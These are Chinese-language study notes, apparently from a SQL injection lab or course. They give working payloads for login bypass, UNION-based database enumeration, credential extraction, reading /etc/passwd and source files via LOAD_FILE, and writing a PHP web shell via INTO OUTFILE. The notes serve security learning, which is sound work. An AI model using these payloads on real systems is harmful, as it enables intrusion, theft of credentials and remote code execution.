1 基础知识：
利用'来判断是否存在sql注入
情景一：基础阶段 有回显提示
![[Pasted image 20240125105134.png]]
初始阶段 
验证sql注入是否存在手段:
1 输入任意值发现题目中回弹的sql注入：原理：

![[Pasted image 20240125105204.png]]

分类 ：
第一类：有回显的sql注入：

阶段目标一：我不需要密码就可以登录admin这个用户 或者说我输入任何密码均可登陆这个用户
逻辑：颠覆这个查询语句的查询逻辑  
其中这个语句是查询logins  表中所有的值并且限定条件在 username = 你输入的值和password 输入的值之间 
其中and 字符决定了当输入的两个值均成立的情况下 ，其串联电路（AND）联通 决定了可以返回登录成功的值  

首先  第一步  拿到这个情景后 需要判断是否存在sql注入 攻击  
将尝试在用户名后添加以下有效负载后  

注：在某些时候碧玺使用url请求  放在burp等有效负载后面 
![[Pasted image 20240125105742.png]]
username 输入任意 比如'
密码输入 sfa 任意字符得到提示         此时的目的是验证是否存在sql注入
![[Pasted image 20240125110255.png]]
此时阅读信息  提示登录错误并且存在语法问题 
使用单个引号导致了奇数引号从而引发了语法错误判断      两种方法可以避免 
1 使用注释注释掉
2 使用偶数个

第二种  利用or  逻辑运算进行 
其中mysql语法揭示了一个观点 就是and 总是在or运算符之前结算
（a and b）or c
所以 只要在其中加入一个or 并且让其 or段一个为恒等 值  
也就是 并联电路任意一个 分路是通的 其结果就是通的 
构造payload : username='admin' or '1' = '1'and password='11111'
由于username =admin 正确 根据规则 先结算  and 两端的值  错误   然后再结算admin 的值 
or左端正确 永远正确
核心 利用or 存在机制 不管中间写啥 都算过 
前提 已知 或者测试 管理员默认 账号是 admin的情况下


如果使用大批量的payload的话  参考以下网站
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass

情景二 ：进行尝试把验证注释掉操作 
其中涉及到的特殊字符有  1 #  ：%23
2-- 
等等 
使用方法  ：例如payload如下：select *form logins where username=‘admin’ -- and password =blabal
在字符串后面直接使用即可


第二类 union查询 操作 
俩查询返回的列数必须一致且相同 不然会报错 产生 

show tables; 是选中这个表后 进行table 查看
ps 查询表格中相关的特定信息的值 
选择 show columns form table名字 查询表中关于 关于 表格的详细信息 

进行注入：
1 在 利用union进行注入前 需要找到服务器选择的列数  
有两种方法 1 用order by 2 用union 
1 用order by 去尝试测试有多少列 
比如:
' order by 2 --    
其中' 为了是包含字符串  orderby 是 猜测查询的列数 2 是猜可能有两列 
-- 是为了将其中后续的内容注释掉 我只猜这个 
进行 从 1 到n的猜测 直到返回的值是 
![[Pasted image 20240128173950.png]]
为止  既为  说明一共有撕裂 

第二种 使用union 并集 
payload 如下：
任意字符' union select 1,2,3,4,5 -- -
这个含义是 用任意字符来让前面的字符串闭合后 
进行union联合查询 union select 1,2,3,4,5
利用的是 union的后面select 的列数必须与 表中的列数完全相同 
比如 表中有3列 那么union select的值是1,2,3 少一个 多一个 都会报错 
![[Pasted image 20240128181747.png]]
形如 这种类型的 工具 
pay load 如下：
```sql
cn' UNION select 1,@@version,3,4-- -
```
其中 @@ version 是调取了version的函数信息  
 再比如 
 若获取user 信息 会有 
 我们将 @@version 改为 user（）即可 
 有 xx’ union select 1，user() ,3,4-- -
类型四 指纹识别 mysql dbms
相关类型如下“
![[Pasted image 20240128182117.png]]
注意何时使用这个类型 

关于默认自带的数据库 INFORMATION_SCHEMA 
上述信息中我们如果需要获取 进一步利用union进行查询  必须掌握如下信息“
1 数据库的列表
2 每个数据库中表的列表
3 每个表中具体的列的名字 
其中默认数据库 information_schema中存储了很多关于数据库的元信息 等内容 
我们可以使用 usersmy_database来查找相关默认的信息

 就比如 去找到 my_database 的相关user信息如下图
 select * from my_database.users;
 可以用这种形式来进行 查找 操作 

第二种： schemata 这个表 
包含当前所有存在的数据库表的名称 
在数据库中payloads如下：
select schema_name from information_schema.schemata;
这段代表的是 在schema 这个默认存储所有数据库的名字的部分 查找他们的名字 在 information_schema这个表里的schemata 这个部分 去找 schema的name的名字的部分
![[Pasted image 20240129124507.png]]
且通常情况下  information_schema 数据库跟performance_schema 数据库 以及mysql数据库是默认的偶尔还有个sys是默认数据库

database()是可以 用在union后面，他的含义是揭示了数据库的名字是什么的含义

第三种 关于table表   包含了所有包含数据库中的信息 其有多个列 其中我们感兴趣的是table_name (存储表名)
table_schema 指向每个表的额数据库 
其中dev数据库是 表示该程序中当前所有数据库的表中正在用的那些表单 

第四种 找到列名  列的表单包含在 column 这个里面   列的名称是 credentials  这个是表的数据的英文单词
其中 credentials 这个 是凭据  这个主要存放表的数据信息 

利用union注入操作如下
首先第一步 输入 在mysql的默认表单中找到对应的表名跟数据库名字：
xxx' union select1， schema_name，2,3 from information_schema.schemata;
目的是 在 information_schema这个表格里存放了很多 数据库的信息 但是无法直接select罗列 但却可以做为其他的默认数据库  每个mysql的机器中都有的

在这个表单里面的 schemata 这个部分是存放了所有的数据库表个 里面去查找schema_name 部分 来查找 有多少的*数据库在这个里面* 
![[Pasted image 20240129144934.png]]
其中  information _schema是默认数据库  performance_schema也是 
但是发现几个独特数据库  
1 lifreight 是 题目中独立存放的数据库信息 
2 dev 是指的是这个数据库存储了当前 所有调用的数据库信息  这么多默认的数据库 调用了多少 

数据库名字确定了 该确定在某个数据库中所有 表的名字了 ，具体表名查询payloads如下：
ccc' union select table_name,table_scheme,3,4 from information_schema.tables where table_schema='dev'
含义是 在information_schema.tables 中查询 到 含有table_name,跟tablescheme 的信息    
并且限制在 dev这个数据库名字中 
其中table_schema 表示了所有数据库为这个dev名字的 
去查有哪些表的名 

表名如下：
![[Pasted image 20240129145821.png]]
在这么多表中，找到我们真正想要的表 的名字 例如credentials 这个表名，然后子啊进一步查询表中有多少列 
其中用的是columns  这个代表了相关数据库中所有列的详细信息  
其中   payload如下
xxx' union select column_name,table_name,table_schema，4 from information_schema.columns where table_name='这里填表名  是credentials'-- -
含义是在information_schema的 columns 这个类型里面 去查询表名为 credentials这个表的信息 其中 填充为  column_name 这个的名字  tablename 表的名字 还有这个表的数据类型 查询表有多少列 分别是什么 
到此为止  我们知道的信息是 数据库名 表名  以及表中我们想要的信息 
![[Pasted image 20240129150439.png]]
至此sql三要素建立完成  其中  提取我们想要的信息
xxx' union select 1,username,password,4 from 这个数据库的名字.这个表的名字-- -

总结 先在默认的库里面找 比如  第一步是select 1，scheme_name,3,4 from information_schema.schemata-- -
注意第一步 获取所有数据库
从总库里获取数据库名字 ---->找到对应数据库后找table名字 --->找到table 后找对应的 culmns 名字--->找到对应列后 进行综合查询即可


sql注入除了获取表单信息外 还可以进行 远程代码执行 读取跟写入操作 
特权：

在mysql中   数据库必须将文件的内容加载到表中 提取表中数据后 决定要不要发送给后端服务器 ，那么如果我们知道了数据库 的掌管 这部分特权的表格 是否就能利用他们 将危险文件 输入到后端服务器中

在dbms 中 是否拥有数据库管理员权限变得十分重要   ，我们需要获取到dba 也就是数据库管理员权限后才可能有 数据库的文件读取权限   
所以 我们为了能获得文件读取权限  ---->需要获取任意数据库的dba 管理员权限---->找当前数据库中所有用户
类似于 命令行中whoami的操作 
我们可以在后端用 ：
```
1 select user()
  select current_user()
  select user from mysql.user
```
其中解释一下 current_user()这个含义是主要返回当前客户端mysql的用户名跟主机名
判断是否是root 模式 

也可以采用union 格式一：

```
1xxx‘ union select 1,user(),3,4-- -
```
这种方法主要是调用这个 user()这个函数 
也可以采用语法二：
```
xxx' union select 1,user,3,4 from mysql.user-- -
```
注意前面的user 跟后面mysql,user一一对应


反馈结果如下  这告诉我们当前在 数据库中权限是什么级别的类型模式

![[Pasted image 20240129153508.png]]
发现是root模式  也就是当前我们是管理员权限  
root用户可能是dba 也就是数据库的管理员权限 

用户权限问题  
现在知道了用户形式  现在开始查找具体对用户权限问题   
用以下语句测试是否有超级管理员权限 
```
select super_priv from mysql.user
```


将这个于union一起结合
```
cn' union select 1,super_priv,3,4 from mysql.user-- -
```

如果有多个用户的话 ：
```
cn' union select 1,super_priv,3,4 from mysql.user where user='root'-- -

```
super_priv
代指超级权限 
若有的话会显示 “
![[Pasted image 20240129160033.png]]

其中  可以添加 where grantee =“’root‘@‘localhost’” 仅显示当前用户root权限  
知道了该用户是root 后 如何查询相关 root权限可以干啥  
payload如下：
cn‘ union select 1,grantee,privilege_type,4 from information_schema.user_privileges where grantee="'root'@'localhost'"-- -
翻译如下：
在一列中列出 grantee （当前的用户 是user还是root等） 还有privilege_type 这个是能干的类型，比如sql中这个用户允许能得到的权限类型    在information_schema 这个默认表里 查询user的 权限 
限定在 用户是 root@localhost的粒粒面 
目的是查询 度跟鞋 等详细细节问题 
![[Pasted image 20240129162645.png]]
其中各种权限如下：
delete ：表格
create：数据库 表或者索引
drop ：数据表或者视图
file 解释着可以读取文件跟写入文件 所以尝试读取文件在sql注入中


读取文件  ：应用函数：load_file()这个函数来读文件
具体格式如下：LOAD_FILE('/文件路径绝对路径')
sql形式：select LOAD_FILE('/etc/passwd');
使用union模式如下：
xxxx' union select 1,load_file('etc/passwd'),3,4 -- -
![[Pasted image 20240129163800.png]]
读取文件成功！
另一种方法 
当前页面是search.php而apache 2 的默认存储路径是/var/www/html的 路径 故可以payload：
cnm' union select 1,load_file('/var/www/html/search.php'),3,4-- -
![[Pasted image 20240129164053.png]] 
成功套娃
可以查看源代码 链接漏洞 ：


文件上传漏洞 （sql版本）：
三件事：    1 file 启用权限用户（有这个权限进行写入操作）
          2 mysql全局 secure_file_priv变量未启用
          3位后端服务器上 写入的服务器对应的写入权限 

关于 安全文件权限 
变量：secure_file_priv确定从何处读或者写    如果为空 则允许从整个文件系统读取 否则 如果设置目录 的话 只能从指定的文件读写  
如果为null 则无法从任何目录读取写入   mariadb默认下为设置为空 
  但是  在mysql默认文件夹中 默认为null 或者一写现代设置默认为null 也就是无法今夕孤独些 
  mysql 对应文件位于目录/var/lib/mysql-files这是默认文件路径


首先 思路如下 ：
如何找到关于secure_file_priv 的内容呢？  变量大部分配置存储在 information_schema中 
mysql全局变量存放在  global_variables的表中 其中：
这个表 ：https://dev.mysql.com/doc/refman/5.7/en/information-schema-variables-table.html
  有两列 ：![[Pasted image 20240129202338.png]]
  我们只需要
  用where  限制在secure_file_priv这个里面 查看是否为空的  
  于是乎 payload如下 ：
```
  select variable_name,variable_value from information_schema.global_variables where variable_name="secure_file_priv"
  
```
```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```
翻译 在information_schema的这张默认存储所有数据库的表中的 这个分支 global_variables 显示全局的变量值 并且 拥有 variable_name 跟variable_value 两列 ，后
定位到具体where 的variable_name 我只要 name为secure_file_priv这一列即可

目的：是为了查找这个数据库中包含secure_file_priv这个值是否是空的还是null 
找到这个的目的是为了通过数据库能向后端发送文件 并且 上传任意恶意的代码并执行
判断是否可以读写到任意的位置  上传文件 

![[Pasted image 20240129203531.png]]
发现这个值是空的 也就是说 允许开放文件上传的写入/读取功能 条件2已具备 
现在进行下一步：

语法  ：select 'xxx' into outfile '存放的文件的路径';
提示：高级文件导出利用“FROM_BASE64("base64_data")”函数，以便能够写入长/高级文件，包括二进制数据。  有待考证 

如果想 在sql基础上编写webshell来进行注入的话 必须知道 web服务器的基本web目录 既web的根目录在哪里  
找到一种方式是用load_file()函数读取对应的.conf的服务器函数的配置   或者是其他环节 

目的 尝试将file written successlly ！ 写入 到/var/www/html/proof.txt直接拍每个 病默契

payload如下：cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'
![[Pasted image 20240129205751.png]]
注入成功！
编写phpwebshell 

编写如下webshell  来达到 让其后端服务器可以执行任意代码的目的
cn' union select "" , '<?php system($_REQUEST[0]); ?>'，“”，“” into outfile '/var/www/html/shell.php '-- -

<?php system("cat /var/www/flag.txt");  ?>
其中 在 system 的"内可以放置任意长度的命令 哈哈哈哈"


其中  进行技能考核“
